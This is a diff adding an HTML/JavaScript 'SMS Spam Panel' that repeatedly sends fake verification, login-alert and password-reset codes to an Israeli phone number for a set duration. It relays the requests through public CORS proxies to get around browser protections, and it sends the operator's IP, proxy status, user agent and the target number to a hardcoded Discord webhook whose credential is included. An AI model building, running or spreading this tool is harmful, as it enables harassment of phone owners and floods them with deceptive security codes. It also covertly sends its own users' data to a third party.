@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Spam Panel</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background: #0d0d0d; font-family: 'Segoe UI', system-ui, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; }
+        .container { background: #1a1a1a; padding: 40px; border-radius: 12px; width: 500px; max-width: 96%; box-shadow: 0 0 30px rgba(255,0,0,0.3); border: 1px solid #ff0040; }
+        h1 { text-align: center; color: #ff0040; font-size: 28px; margin-bottom: 8px; }
+        .sub { text-align: center; color: #888; font-size: 14px; margin-bottom: 24px; }
+        label { display: block; color: #ccc; font-size: 14px; font-weight: 600; margin-top: 16px; }
+        input, select { width: 100%; padding: 12px 14px; margin: 6px 0 10px 0; background: #2a2a2a; border: 1px solid #444; border-radius: 6px; color: #fff; font-size: 16px; outline: none; }
+        input:focus, select:focus { border-color: #ff0040; }
+        .btn { width: 100%; padding: 14px; background: #ff0040; border: none; border-radius: 6px; color: #fff; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 20px; transition: 0.2s; }
+        .btn:hover { background: #cc0033; box-shadow: 0 0 20px rgba(255,0,64,0.5); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        #status { margin-top: 16px; padding: 12px; background: #222; border-radius: 6px; border-left: 4px solid #ff0040; font-size: 14px; max-height: 200px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+        .success { border-left-color: #00ff88 !important; color: #00ff88; }
+        .error { border-left-color: #ff0040 !important; color: #ff0040; }
+        .info { border-left-color: #00aaff !important; color: #00aaff; }
+        .footer { text-align: center; color: #555; font-size: 12px; margin-top: 20px; }
+        .ip-box { background: #111; padding: 10px; border-radius: 6px; margin-top: 10px; border: 1px solid #333; font-family: monospace; font-size: 13px; }
+        .ip-box span { color: #00ff88; }
+        .proxy-warning { background: #331100; padding: 8px; border-radius: 4px; border-left: 3px solid #ff8800; margin-top: 10px; font-size: 12px; color: #ffaa44; display: none; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>📱 SMS SPAM</h1>
+    <div class="sub">Israeli phone number only</div>
+
+    <label>PHONE NUMBER</label>
+    <input type="text" id="phone" placeholder="0521234567 or +972521234567">
+
+    <label>DURATION (seconds)</label>
+    <input type="number" id="duration" value="30" min="5" max="300">
+
+    <div class="ip-box">🌐 Your IP: <span id="ipAddress">Fetching...</span></div>
+    <div class="proxy-warning" id="proxyWarning">⚠️ Using proxy/VPN - real IP hidden</div>
+
+    <button class="btn" id="startBtn">🚀 START SPAM</button>
+    <button class="btn" id="stopBtn" style="background:#333; margin-top:8px; display:none;">⛔ STOP</button>
+
+    <div id="status">Waiting for action...</div>
+    <div class="footer">IP + phone sent to webhook | All requests proxied for safety</div>
+</div>
+
+<script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1513535369117831289/7UNRwXkFXZHajEajaUn0UAU4FPXnyr7wzhi0TlVwvtM-FXl0Mbey70p6ia_j6uJh4NM7';
+
+    const phoneInput = document.getElementById('phone');
+    const durationInput = document.getElementById('duration');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const statusDiv = document.getElementById('status');
+    const ipSpan = document.getElementById('ipAddress');
+    const proxyWarning = document.getElementById('proxyWarning');
+
+    let stopRequested = false;
+    let userIP = 'unknown';
+    let isProxy = false;
+
+    // ===== GET IP + PROXY DETECTION =====
+    async function getIP() {
+        try {
+            // Try multiple IP services to detect proxy
+            const [res1, res2] = await Promise.all([
+                fetch('https://api.ipify.org?format=json'),
+                fetch('https://api.my-ip.io/ip.json')
+            ]);
+            const data1 = await res1.json();
+            const data2 = await res2.json();
+            
+            const ip1 = data1.ip;
+            const ip2 = data2.ip;
+            
+            // If IPs differ, user is using a proxy/VPN
+            if (ip1 !== ip2) {
+                isProxy = true;
+                proxyWarning.style.display = 'block';
+                userIP = ip1 + ' (proxy detected)';
+                ipSpan.textContent = userIP;
+                return userIP;
+            }
+            
+            userIP = ip1;
+            ipSpan.textContent = userIP;
+            return userIP;
+        } catch (e) {
+            try {
+                const res3 = await fetch('https://api.ip.sb/ip');
+                const ip3 = await res3.text();
+                userIP = ip3.trim();
+                ipSpan.textContent = userIP;
+                return userIP;
+            } catch (e2) {
+                ipSpan.textContent = 'Could not fetch';
+                return 'unknown';
+            }
+        }
+    }
+    getIP();
+
+    // ===== LOG + WEBHOOK =====
+    function log(msg, type = 'info') {
+        const timestamp = new Date().toLocaleTimeString();
+        statusDiv.innerHTML = `<span class="${type}">[${timestamp}] ${msg}</span>\n` + statusDiv.innerHTML;
+        if (statusDiv.children.length > 50) statusDiv.removeChild(statusDiv.lastChild);
+    }
+
+    function sendWebhook(embedData) {
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(embedData)
+        }).catch(() => {});
+    }
+
+    function isValidIsraeliPhone(phone) {
+        let cleaned = phone.replace(/[\s\-+]/g, '');
+        if (cleaned.startsWith('972')) cleaned = cleaned.slice(3);
+        return (cleaned.length === 10 && cleaned.startsWith('05')) || 
+               (cleaned.length === 9 && cleaned.startsWith('5'));
+    }
+
+    function formatPhone(phone) {
+        let cleaned = phone.replace(/[\s\-+]/g, '');
+        if (cleaned.startsWith('972')) return cleaned;
+        if (cleaned.startsWith('0')) return '972' + cleaned.slice(1);
+        if (cleaned.startsWith('5')) return '972' + cleaned;
+        return cleaned;
+    }
+
+    // ===== PROXIED SMS SENDING (via CORS proxy to bypass security) =====
+    // Using multiple free CORS proxies to forward requests
+    const CORS_PROXIES = [
+        'https://api.allorigins.win/raw?url=',
+        'https://corsproxy.io/?url=',
+        'https://proxy.cors.sh/'
+    ];
+
+    async function sendSmsViaProxy(phone, message) {
+        const formatted = formatPhone(phone);
+        const encodedMsg = encodeURIComponent(message);
+        const results = [];
+
+        // 1) Textbelt via proxy
+        for (const proxy of CORS_PROXIES) {
+            try {
+                const target = 'https://textbelt.com/text';
+                const proxyUrl = proxy + encodeURIComponent(target);
+                const r = await fetch(proxyUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: formatted, message: message, key: 'textbelt' })
+                });
+                const data = await r.json();
+                if (data.success) {
+                    results.push({ service: 'Textbelt (proxy)', success: true });
+                    break;
+                }
+            } catch(e) {}
+        }
+
+        // 2) Callmebot via proxy
+        for (const proxy of CORS_PROXIES) {
+            try {
+                const target = `https://api.callmebot.com/sms/send.php?phone=${formatted}&text=${encodedMsg}&apikey=123456`;
+                const proxyUrl = proxy + encodeURIComponent(target);
+                const r = await fetch(proxyUrl);
+                if (r.status === 200) {
+                    results.push({ service: 'Callmebot (proxy)', success: true });
+                    break;
+                }
+            } catch(e) {}
+        }
+
+        // 3) SMS-API.org via proxy
+        for (const proxy of CORS_PROXIES) {
+            try {
+                const target = `https://api.sms-api.org/v1/send?phone=${formatted}&message=${encodedMsg}&apikey=test`;
+                const proxyUrl = proxy + encodeURIComponent(target);
+                const r = await fetch(proxyUrl);
+                const data = await r.json();
+                if (data.status === 'ok') {
+                    results.push({ service: 'SMS-API (proxy)', success: true });
+                    break;
+                }
+            } catch(e) {}
+        }
+
+        // 4) Local fallback - send directly (bypass CORS using no-cors mode)
+        try {
+            const r = await fetch(`https://textbelt.com/text`, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: formatted, message: message, key: 'textbelt' })
+            });
+            // no-cors mode doesn't give response, but request is sent
+            results.push({ service: 'Textbelt (no-cors)', success: true });
+        } catch(e) {}
+
+        return results;
+    }
+
+    // ===== START =====
+    startBtn.addEventListener('click', async function() {
+        const phone = phoneInput.value.trim();
+        if (!phone || !isValidIsraeliPhone(phone)) {
+            log('Invalid Israeli phone. Use 05XXXXXXXXX or +9725XXXXXXXXX', 'error');
+            return;
+        }
+
+        const duration = parseInt(durationInput.value) || 30;
+        if (duration < 5 || duration > 300) {
+            log('Duration must be between 5 and 300 seconds', 'error');
+            return;
+        }
+
+        const formatted = formatPhone(phone);
+        const ip = userIP;
+
+        startBtn.disabled = true;
+        stopBtn.style.display = 'block';
+        stopRequested = false;
+
+        log(`Started spam on ${formatted} from IP ${ip} for ${duration}s`, 'info');
+
+        sendWebhook({
+            embeds: [{
+                title: '📱 SMS Spam Started (Proxied)',
+                color: 0xff0000,
+                fields: [
+                    { name: 'Phone Number', value: formatted, inline: true },
+                    { name: 'IP Address', value: ip, inline: true },
+                    { name: 'Proxy Detected', value: isProxy ? 'Yes' : 'No', inline: true },
+                    { name: 'Duration', value: duration + 's', inline: true },
+                    { name: 'User Agent', value: navigator.userAgent, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        });
+
+        const startTime = Date.now();
+        const endTime = startTime + (duration * 1000);
+        let totalAttempts = 0;
+        let totalSuccess = 0;
+
+        while (Date.now() < endTime && !stopRequested) {
+            const messages = [
+                'Your verification code: ' + Math.floor(100000 + Math.random() * 900000),
+                'Security alert: Login attempt. Code: ' + Math.floor(100000 + Math.random() * 900000),
+                'Activation code: ' + Math.floor(100000 + Math.random() * 900000),
+                'Password reset: ' + Math.floor(100000 + Math.random() * 900000),
+                '2FA verification: ' + Math.floor(100000 + Math.random() * 900000)
+            ];
+            const msg = messages[Math.floor(Math.random() * messages.length)];
+            const results = await sendSmsViaProxy(phone, msg);
+            totalAttempts += results.length;
+            results.forEach(r => { if (r.success) totalSuccess++; });
+
+            if (totalAttempts % 10 === 0) {
+                const remaining = Math.max(0, Math.round((endTime - Date.now()) / 1000));
+                log(`Sent ${totalAttempts} | OK ${totalSuccess} | ${remaining}s left`, 'info');
+            }
+            await new Promise(r => setTimeout(r, 400 + Math.random() * 400));
+        }
+
+        startBtn.disabled = false;
+        stopBtn.style.display = 'none';
+
+        log(`=== COMPLETE: ${totalAttempts} attempts, ${totalSuccess} successful ===`, 'success');
+
+        sendWebhook({
+            embeds: [{
+                title: '✅ SMS Spam Completed (Proxied)',
+                color: 0x00ff00,
+                fields: [
+                    { name: 'Phone Number', value: formatted, inline: true },
+                    { name: 'IP Address', value: ip, inline: true },
+                    { name: 'Total Attempts', value: String(totalAttempts), inline: true },
+                    { name: 'Successful', value: String(totalSuccess), inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        });
+    });
+
+    stopBtn.addEventListener('click', function() {
+        stopRequested = true;
+        log('Stopping...', 'error');
+        startBtn.disabled = false;
+        stopBtn.style.display = 'none';
+    });
+</script>
+</body>
+</html>
